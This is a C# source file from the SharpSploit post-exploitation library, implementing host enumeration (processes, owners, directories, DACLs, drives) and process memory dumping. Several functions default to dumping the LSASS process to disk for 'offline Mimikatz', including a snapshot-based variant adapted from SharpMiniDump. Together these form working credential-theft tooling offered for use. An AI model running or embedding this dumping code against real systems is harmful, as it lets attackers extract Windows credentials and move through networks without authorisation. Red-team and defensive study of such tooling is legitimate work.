﻿// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.IO;
using System.Linq;
using System.Diagnostics;
using System.Security.Principal;
using System.Collections.Generic;
using System.Security.AccessControl;
using System.Runtime.InteropServices;

using SharpSploit.Misc;
using SharpSploit.Generic;
using SharpSploit.Execution;
using PInvoke = SharpSploit.Execution.PlatformInvoke;

namespace SharpSploit.Enumeration
{
    /// <summary>
    /// Host is a library for local host enumeration.
    /// </summary>
    public class Host
    {
        /// <summary>
        /// Gets a list of running processes on the system.
        /// </summary>
        /// <returns>List of ProcessResults.</returns>
        public static SharpSploitResultList<ProcessResult> GetProcessList()
        {
            var processorArchitecture = GetArchitecture();
            Process[] processes = Process.GetProcesses().OrderBy(P => P.Id).ToArray();
            SharpSploitResultList<ProcessResult> results = new SharpSploitResultList<ProcessResult>();
            foreach (Process process in processes)
            {
                int processId = process.Id;
                int parentProcessId = GetParentProcess(process);
                string processName = process.ProcessName;
                string processPath = string.Empty;
                int sessionId = process.SessionId;
                string processOwner = GetProcessOwner(process);
                Win32.Kernel32.Platform processArch = Win32.Kernel32.Platform.Unknown;

                if (parentProcessId != 0)
                {
                    try
                    {
                        processPath = process.MainModule.FileName;
                    }
                    catch (System.ComponentModel.Win32Exception) { }
                }

                if (processorArchitecture == Win32.Kernel32.Platform.x64)
                {
                    processArch = IsWow64(process) ? Win32.Kernel32.Platform.x86 : Win32.Kernel32.Platform.x64;
                }
                else if (processorArchitecture == Win32.Kernel32.Platform.x86)
                {
                    processArch = Win32.Kernel32.Platform.x86;
                }
                else if (processorArchitecture == Win32.Kernel32.Platform.IA64)
                {
                    processArch = Win32.Kernel32.Platform.x86;
                }
                results.Add(new ProcessResult
                {
                    Pid = processId,
                    Ppid = parentProcessId,
                    Name = processName,
                    Path = processPath,
                    SessionID = sessionId,
                    Owner = processOwner,
                    Architecture = processArch
                });
            }
            return results;
        }

        /// <summary>
        /// Gets the architecture of the OS.
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        public static Win32.Kernel32.Platform GetArchitecture()
        {
            const ushort PROCESSOR_ARCHITECTURE_INTEL = 0;
            const ushort PROCESSOR_ARCHITECTURE_IA64 = 6;
            const ushort PROCESSOR_ARCHITECTURE_AMD64 = 9;

            var sysInfo = new Win32.Kernel32.SYSTEM_INFO();
            PInvoke.Win32.Kernel32.GetNativeSystemInfo(ref sysInfo);

            switch (sysInfo.wProcessorArchitecture)
            {
                case PROCESSOR_ARCHITECTURE_AMD64:
                    return Win32.Kernel32.Platform.x64;
                case PROCESSOR_ARCHITECTURE_INTEL:
                    return Win32.Kernel32.Platform.x86;
                case PROCESSOR_ARCHITECTURE_IA64:
                    return Win32.Kernel32.Platform.IA64;
                default:
                    return Win32.Kernel32.Platform.Unknown;
            }
        }

        /// <summary>
        /// Gets the parent process id of a Process
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <param name="Process"></param>
        /// <returns>Parent Process Id. Returns 0 if unsuccessful</returns>
        public static int GetParentProcess(Process Process)
        {
            try
            {
                return GetParentProcess(Process.Handle);
            }
            catch (InvalidOperationException)
            {
                return 0;
            }
            catch (System.ComponentModel.Win32Exception)
            {
                return 0;
            }
        }

        /// <summary>
        /// Gets the parent process id of a process handle
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <param name="Handle">Handle to the process to get the parent process id of</param>
        /// <returns>Parent Process Id</returns>
        private static int GetParentProcess(IntPtr Handle)
        {
            var basicProcessInformation = new Native.PROCESS_BASIC_INFORMATION();
            IntPtr pProcInfo = Marshal.AllocHGlobal(Marshal.SizeOf(basicProcessInformation));
            Marshal.StructureToPtr(basicProcessInformation, pProcInfo, true);
            PInvoke.Native.NtQueryInformationProcess(Handle, Native.PROCESSINFOCLASS.ProcessBasicInformation, pProcInfo, Marshal.SizeOf(basicProcessInformation), out int returnLength);
            basicProcessInformation = (Native.PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pProcInfo, typeof(Native.PROCESS_BASIC_INFORMATION));

            return basicProcessInformation.InheritedFromUniqueProcessId;
        }

        /// <summary>
        /// Gets the username of the owner of a process
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <param name="Process">Process to get owner of</param>
        /// <returns>Username of process owner. Returns empty string if unsuccessful.</returns>
        public static string GetProcessOwner(Process Process)
        {
            try
            {
                PInvoke.Win32.Kernel32.OpenProcessToken(Process.Handle, 8, out IntPtr handle);
                using (var winIdentity = new WindowsIdentity(handle))
                {
                    return winIdentity.Name;
                }
            }
            catch (InvalidOperationException)
            {
                return string.Empty;
            }
            catch (System.ComponentModel.Win32Exception)
            {
                return string.Empty;
            }
        }

        /// <summary>
        /// Checks if a process is a Wow64 process
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <param name="Process">Process to check Wow64</param>
        /// <returns>True if process is Wow64, false otherwise. Returns false if unsuccessful.</returns>
        public static bool IsWow64(Process Process)
        {
            try
            {
                PInvoke.Win32.Kernel32.IsWow64Process(Process.Handle, out bool isWow64);
                return isWow64;
            }
            catch (InvalidOperationException)
            {
                return false;
            }
            catch (System.ComponentModel.Win32Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// Generates a minidump that represents the memory of a running process. Useful for offline Mimikatz
        /// if dumping the LSASS process. (Requires Admin)
        /// </summary>
        /// <param name="processId">Process ID of the process to generate a minidump for.</param>
        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
        /// <param name="outputFileName">Filename to output the minidump to.</param>
        /// <returns>True if minidump succeeds, false otherwise.</returns>
        /// <remarks>
        /// Authored by Justin Bui (@youslydawg).
        /// </remarks>
        public static bool CreateProcessDump(int processId, string outputPath = "", string outputFileName = "")
        {
            return CreateProcessDump(Process.GetProcessById(processId), outputPath, outputFileName);
        }

        /// <summary>
        /// Generates a minidump that represents the memory of a running process. Useful for offline Mimikatz
        /// if dumping the LSASS process. (Requires Admin)
        /// </summary>
        /// <param name="processName">Name of the process to generate a minidump for.</param>
        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
        /// <returns>True if minidump succeeds, false otherwise.</returns>
        /// <remarks>
        /// Authored by Justin Bui (@youslydawg).
        /// </remarks>
        public static bool CreateProcessDump(string processName = "lsass", string outputPath = "", string outputFileName = "")
        {
            if (processName.EndsWith(".exe"))
            {
                processName = processName.Substring(0, processName.Length - 4);
            }
            Process[] process_list = Process.GetProcessesByName(processName);
            if (process_list.Length > 0)
            {
                return CreateProcessDump(process_list[0], outputPath, outputFileName);
            }
            return false;
        }

        /// <summary>
        /// Generates a minidump that represents the memory of a running process. Useful for offline Mimikatz
        /// if dumping the LSASS process. (Requires Admin)
        /// </summary>
        /// <param name="process">Process to generate a minidump for.</param>
        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
        /// <returns>True if minidump succeeds, false otherwise.</returns>
        /// <remarks>
        /// Authored by Justin Bui (@youslydawg).
        /// </remarks>
        public static bool CreateProcessDump(Process process, string outputPath = "", string outputFileName = "")
        {
            if (outputPath == "" || outputPath == null)
            {
                outputPath = GetCurrentDirectory();
            }
            if (outputFileName == "" || outputFileName == null)
            {
                outputFileName = process.ProcessName + "_" + process.Id + ".dmp";
            }
            
            string fullPath = Path.Combine(outputPath, outputFileName);
            FileStream fileStream = File.Create(fullPath);
            bool success = false;
            try
            {
                success = PInvoke.Win32.Dbghelp.MiniDumpWriteDump(process.Handle, (uint)process.Id, fileStream.SafeFileHandle, Execution.Win32.Dbghelp.MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
            catch (System.ComponentModel.Win32Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }

            fileStream.Close();
            if (!success)
            {
                File.Delete(fullPath);
            }
            return success;
        }

        /// <summary>
        /// Auxiliary function for MiniDrumpWriteDump callbacks.
        /// </summary>
        /// <param name="CallbackParam"></param>
        /// <param name="CallbackInput"></param>
        /// <param name="CallbackOutput"></param>
        /// <returns>True if minidump succeeds, false otherwise.</returns>
        /// <remarks>
        /// Authored by Simone Salucci (@saim1z) and Daniel López (@attl4s).
        /// Code adapted from https://github.com/b4rtik/SharpMiniDump
        /// and https://github.com/mjsabby/CopyOnWriteDump
        /// </remarks>
        private static bool MiniDumpWriteDumpCallback(IntPtr CallbackParam, ref Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_INPUT CallbackInput, ref Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_OUTPUT CallbackOutput)
        {
            switch (CallbackInput.CallbackType)
            {
                case Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_TYPE.IsProcessSnapshotCallback:
                    CallbackOutput.Status = 1;
                    break;
            }
            return true;
        }

        /// <summary>
        /// Creates a snapshot (PssCaptureSnapshot) of a process and dumps it (MiniDumpWriteDump).
        /// Minimum supported Windows: Windows 8.1+ and Windows Server 2012+
        /// </summary>
        /// <param name="processId">Process ID of the process to generate a minidump for.</param>
        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
        /// <returns>True if snapshut dump succeeds, false otherwise.</returns>
        /// <remarks>
        /// Authored by Simone Salucci (@saim1z) and Daniel López (@attl4s).
        /// Code adapted from https://github.com/b4rtik/SharpMiniDump
        /// and https://github.com/mjsabby/CopyOnWriteDump
        /// </remarks>
        public static bool CreateProcessSnapshotDump(int processId, string outputPath = "", string outputFileName = "")
        {
            return CreateProcessSnapshotDump(Process.GetProcessById(processId), outputPath, outputFileName);
        }

        /// <summary>
        /// Creates a snapshot (PssCaptureSnapshot) of a process and dumps it (MiniDumpWriteDump).
        /// Minimum supported Windows: Windows 8.1+ and Windows Server 2012+
        /// </summary>
        /// <param name="processName">Name of the process to generate a minidump for.</param>
        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
        /// <returns>True if snapshut dump succeeds, false otherwise.</returns>
        /// <remarks>
        /// Authored by Simone Salucci (@saim1z) and Daniel López (@attl4s).
        /// Code adapted from https://github.com/b4rtik/SharpMiniDump
        /// and https://github.com/mjsabby/CopyOnWriteDump
        /// </remarks>
        public static bool CreateProcessSnapshotDump(string processName = "lsass", string outputPath = "", string outputFileName = "")
        {
            if (processName.EndsWith(".exe"))
            {
                processName = processName.Substring(0, processName.Length - 4);
            }
            Process[] process_list = Process.GetProcessesByName(processName);
            if (process_list.Length > 0)
            {
                return CreateProcessSnapshotDump(process_list[0], outputPath, outputFileName);
            }
            return false;
        }

        /// <summary>
        /// Creates a snapshot (PssCaptureSnapshot) of a process and dumps it (MiniDumpWriteDump).
        /// Minimum supported Windows versions: Windows 8.1+ and Windows Server 2012+
        /// </summary>
        /// <param name="process">Process to generate a minidump for.</param>
        /// <param name="outputPath">Path to write output file in. Defaults to the current directory.</param>
        /// <param name="outputFileName">Filename to ouput the minidump to.</param>
        /// <returns>True if snapshut dump succeeds, false otherwise.</returns>
        /// <remarks>
        /// Authored by Simone Salucci (@saim1z) and Daniel López (@attl4s).
        /// Code adapted from https://github.com/b4rtik/SharpMiniDump
        /// and https://github.com/mjsabby/CopyOnWriteDump
        /// </remarks>
        public static bool CreateProcessSnapshotDump(Process process, string outputPath = "", string outputFileName = "")
        {
            if (outputPath == "" || outputPath == null)
            {
                outputPath = GetCurrentDirectory();
            }
            if (outputFileName == "" || outputFileName == null)
            {
                outputFileName = process.ProcessName + "_" + process.Id + ".dmp";
            }
            
            string fullPath = Path.Combine(outputPath, outputFileName);
            FileStream fileStream = new FileStream(fullPath, FileMode.Create);

            IntPtr snapshotHandle;

            Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS flags =
                  Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE
                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLES
                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_NAME_INFORMATION
                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_BASIC_INFORMATION
                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TRACE
                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREADS
                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT
                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY
                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY_OPTIONAL
                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_USE_VM_ALLOCATIONS
                | Execution.Win32.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_RELEASE_SECTION;

            snapshotHandle = IntPtr.Zero;

            try
            {
                Int32 hr = PInvoke.Win32.Kernel32.PssCaptureSnapshot(process.Handle, flags, IntPtr.Size == 8 ? 0x0010001F : 0x0001003F, out snapshotHandle);
            }
            catch (EntryPointNotFoundException e)
            {
                Console.Error.WriteLine(e.Message);
                return false;
            }

            Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_INFORMATION CallbackInfo = new Execution.Win32.Dbghelp.MINIDUMP_CALLBACK_INFORMATION();
            CallbackInfo.CallbackRoutine = Host.MiniDumpWriteDumpCallback;
            CallbackInfo.CallbackParam = IntPtr.Zero;

            IntPtr pCallbackInfo = Marshal.AllocHGlobal(Marshal.SizeOf(CallbackInfo));
            Marshal.StructureToPtr(CallbackInfo, pCallbackInfo, false);

            bool success = false;
            try
            {
                success = PInvoke.Win32.Dbghelp.MiniDumpWriteDump(snapshotHandle, (uint)process.Id, fileStream.SafeFileHandle, Execution.Win32.Dbghelp.MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, pCallbackInfo);
            }
            catch (System.ComponentModel.Win32Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }

            fileStream.Close();
            if (!success)
            {
                File.Delete(fullPath);
            }
            
            IntPtr vaCloneHandle;
            PInvoke.Win32.Kernel32.PssQuerySnapshot(snapshotHandle, Execution.Win32.Kernel32.PSS_QUERY_INFORMATION_CLASS.PSS_QUERY_VA_CLONE_INFORMATION, out vaCloneHandle, IntPtr.Size);

            int cloneProcessId = PInvoke.Win32.Kernel32.GetProcessId(vaCloneHandle);

            PInvoke.Win32.Kernel32.PssFreeSnapshot(Process.GetCurrentProcess().Handle, snapshotHandle);
            PInvoke.Win32.Kernel32.CloseHandle(vaCloneHandle);
            
            Marshal.FreeHGlobal(pCallbackInfo);
            GC.KeepAlive(CallbackInfo);
            return success;
        }

        /// <summary>
        /// Gets the hostname of the system.
        /// </summary>
        /// <returns>Hostname of the system.</returns>
        public static string GetHostname()
		{
			return Environment.MachineName;
		}

        /// <summary>
        /// Gets the Domain name and username of the current logged on user.
        /// </summary>
        /// <returns>Current username.</returns>
        public static string GetUsername()
		{
			return Environment.UserDomainName + "\\" + Environment.UserName;
		}

        /// <summary>
        /// Gets the full path of the current working directory.
        /// </summary>
        /// <returns>Current working directory.</returns>
        public static string GetCurrentDirectory()
		{
			return Directory.GetCurrentDirectory();
		}

        /// <summary>
        /// Gets a directory listing of the current working directory.
        /// </summary>
        /// <returns>List of FileSystemEntryResults.</returns>
		public static SharpSploitResultList<FileSystemEntryResult> GetDirectoryListing()
		{
            return GetDirectoryListing(GetCurrentDirectory());
		}

        /// <summary>
        /// Gets a directory listing of a directory.
        /// </summary>
        /// <param name="Path">The path of the directory to get a listing of.</param>
        /// <returns>SharpSploitResultList of FileSystemEntryResults.</returns>
		public static SharpSploitResultList<FileSystemEntryResult> GetDirectoryListing(string Path)
        {
            SharpSploitResultList<FileSystemEntryResult> results = new SharpSploitResultList<FileSystemEntryResult>();
            foreach (string dir in Directory.GetDirectories(Path))
            {
                DirectoryInfo dirInfo = new DirectoryInfo(dir);
                results.Add(new FileSystemEntryResult
                {
                    Name = dirInfo.FullName,
                    Length = 0,
                    CreationTimeUtc = dirInfo.CreationTimeUtc,
                    LastAccessTimeUtc = dirInfo.LastAccessTimeUtc,
                    LastWriteTimeUtc = dirInfo.LastWriteTimeUtc
                });
            }
            foreach (string file in Directory.GetFiles(Path))
            {
                FileInfo fileInfo = new FileInfo(file);
                results.Add(new FileSystemEntryResult
                {
                    Name = fileInfo.FullName,
                    Length = fileInfo.Length,
                    CreationTimeUtc = fileInfo.CreationTimeUtc,
                    LastAccessTimeUtc = fileInfo.LastAccessTimeUtc,
                    LastWriteTimeUtc = fileInfo.LastWriteTimeUtc
                });
            }
            return results;
        }

        /// <summary>
        /// Gets a DACL of a file or directory.
        /// </summary>
        /// <param name="Path">The path of the file or directory to get a DACL for.</param>
        /// <returns>List of DaclResults. NULL if not found.</returns>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
		public static SharpSploitResultList<DaclResult> GetDacl(string Path)
        {
            if (File.Exists(Path))
            {
                return GetDaclResults(new FileInfo(Path).GetAccessControl());
            }
            if (Directory.Exists(Path))
            {
                DirectoryInfo dInfo = new DirectoryInfo(Path);
                return GetDaclResults(new DirectoryInfo(Path).GetAccessControl());
            }
            return null;
        }

        private static SharpSploitResultList<DaclResult> GetDaclResults(FileSystemSecurity SecurityEntry)
        {
            SharpSploitResultList<DaclResult> results = new SharpSploitResultList<DaclResult>();
            foreach (FileSystemAccessRule ace in SecurityEntry.GetAccessRules(true, true, typeof(NTAccount)))
            {
                results.Add(new DaclResult
                {
                    IdentityReference = ace.IdentityReference.Value,
                    AccessControlType = ace.AccessControlType,
                    FileSystemRights = ace.FileSystemRights,
                    IsInherited = ace.IsInherited,
                    InheritanceFlags = ace.InheritanceFlags,
                    PropagationFlags = ace.PropagationFlags
                });
            }
            return results;
        }

        /// <summary>
        /// Changes the current working directory.
        /// </summary>
        /// <param name="DirectoryName">Relative or absolute path to new working directory.</param>
        public static void ChangeCurrentDirectory(string DirectoryName)
        {
            Directory.SetCurrentDirectory(DirectoryName);
        }

        /// <summary>
        /// Gets information about current drives.
        /// </summary>
        /// <returns>SharpSploitResultList of DriveInfoResults</returns>
        public static SharpSploitResultList<DriveInfoResult> GetDrives()
        {
            SharpSploitResultList<DriveInfoResult> results = new SharpSploitResultList<DriveInfoResult>();
            DriveInfo[] drives = DriveInfo.GetDrives();

            foreach (DriveInfo drive in drives)
            {
                DriveInfoResult info = new DriveInfoResult
                {
                    Name = drive.Name,
                    Type = drive.DriveType
                };
                if (drive.IsReady)
                {
                    info.Label = drive.VolumeLabel;
                    info.Format = drive.DriveFormat;
                    info.Capacity = Utilities.ConvertFileLengthForDisplay(drive.TotalSize);
                    info.FreeSpace = Utilities.ConvertFileLengthForDisplay(drive.AvailableFreeSpace);
                }
                results.Add(info);
            }
            return results;
        }

        /// <summary>
        /// ProcessResult represents a running process, used with the GetProcessList() function.
        /// </summary>
        public sealed class ProcessResult : SharpSploitResult
        {
            public int Pid { get; set; } = 0;
            public int Ppid { get; set; } = 0;
            public string Name { get; set; } = "";
            public string Path { get; set; } = "";
            public int SessionID { get; set; } = 0;
            public string Owner { get; set; } = "";
            public Win32.Kernel32.Platform Architecture { get; set; } = Win32.Kernel32.Platform.Unknown;
            protected internal override IList<SharpSploitResultProperty> ResultProperties
            {
                get
                {
                    return new List<SharpSploitResultProperty> {
                        new SharpSploitResultProperty { Name = "Pid", Value = this.Pid },
                        new SharpSploitResultProperty { Name = "Ppid", Value = this.Ppid },
                        new SharpSploitResultProperty { Name = "Name", Value = this.Name },
                        new SharpSploitResultProperty { Name = "SessionID", Value = this.SessionID },
                        new SharpSploitResultProperty { Name = "Owner", Value = this.Owner },
                        new SharpSploitResultProperty { Name = "Architecture", Value = this.Architecture },
                        new SharpSploitResultProperty { Name = "Path", Value = this.Path }
                    };
                }
            }
        }

        /// <summary>
        /// FileSystemEntryResult represents a file on disk, used with the GetDirectoryListing() function.
        /// </summary>
        public sealed class FileSystemEntryResult : SharpSploitResult
        {
            public string Name { get; set; } = "";
            public long Length { get; set; } = 0;
            public DateTime CreationTimeUtc { get; set; } = new DateTime();
            public DateTime LastAccessTimeUtc { get; set; } = new DateTime();
            public DateTime LastWriteTimeUtc { get; set; } = new DateTime();
            protected internal override IList<SharpSploitResultProperty> ResultProperties
            {
                get
                {
                    return new List<SharpSploitResultProperty>
                    {
                        new SharpSploitResultProperty
                        {
                            Name = "Name",
                            Value = this.Name
                        },
                        new SharpSploitResultProperty
                        {
                            Name = "Length",
                            Value = this.Length
                        },
                        new SharpSploitResultProperty
                        {
                            Name = "CreationTimeUtc",
                            Value = this.CreationTimeUtc
                        },
                        new SharpSploitResultProperty
                        {
                            Name = "LastAccessTimeUtc",
                            Value = this.LastAccessTimeUtc
                        },
                        new SharpSploitResultProperty
                        {
                            Name = "LastWriteTimeUtc",
                            Value = this.LastWriteTimeUtc
                        }
                    };
                }
            }
        }

        /// <summary>
        /// DaclResult represents a DACL of a file or directory on disk, used with the GetDacl() function.
        /// </summary>
        public sealed class DaclResult : SharpSploitResult
        {
            public string IdentityReference { get; set; } = "";
            public AccessControlType AccessControlType { get; set; } = new AccessControlType();
            public FileSystemRights FileSystemRights { get; set; } = new FileSystemRights();
            public bool IsInherited { get; set; } = false;
            public InheritanceFlags InheritanceFlags { get; set; } = new InheritanceFlags();
            public PropagationFlags PropagationFlags { get; set; } = new PropagationFlags();
            protected internal override IList<SharpSploitResultProperty> ResultProperties
            {
                get
                {
                    return new List<SharpSploitResultProperty> {
                        new SharpSploitResultProperty { Name = "IdentityReference", Value = this.IdentityReference },
                        new SharpSploitResultProperty { Name = "AccessControlType", Value = this.AccessControlType },
                        new SharpSploitResultProperty { Name = "FileSystemRights", Value = this.FileSystemRights },
                        new SharpSploitResultProperty { Name = "IsInherited", Value = this.IsInherited },
                        new SharpSploitResultProperty { Name = "InheritanceFlags", Value = this.InheritanceFlags },
                        new SharpSploitResultProperty { Name = "PropagationFlags", Value = this.PropagationFlags }
                    };
                }
            }
        }

        /// <summary>
        /// DriveInfoResult represents information about a drive.
        /// </summary>
        public sealed class DriveInfoResult : SharpSploitResult
        {
            public string Name { get; set; } = "";
            public DriveType Type { get; set; } = DriveType.Unknown;
            public string Label { get; set; } = "";
            public string Format { get; set; } = "";
            public string Capacity { get; set; } = "";
            public string FreeSpace { get; set; } = "";

            protected internal override IList<SharpSploitResultProperty> ResultProperties
            {
                get
                {
                    return new List<SharpSploitResultProperty>
                    {
                        new SharpSploitResultProperty { Name = "Name", Value = Name },
                        new SharpSploitResultProperty { Name = "Type", Value = Type },
                        new SharpSploitResultProperty { Name = "Label", Value = Label },
                        new SharpSploitResultProperty { Name = "Format", Value = Format },
                        new SharpSploitResultProperty { Name = "Capacity", Value = Capacity },
                        new SharpSploitResultProperty { Name = "FreeSpace", Value = FreeSpace }
                    };
                }
            }
        }
    }
}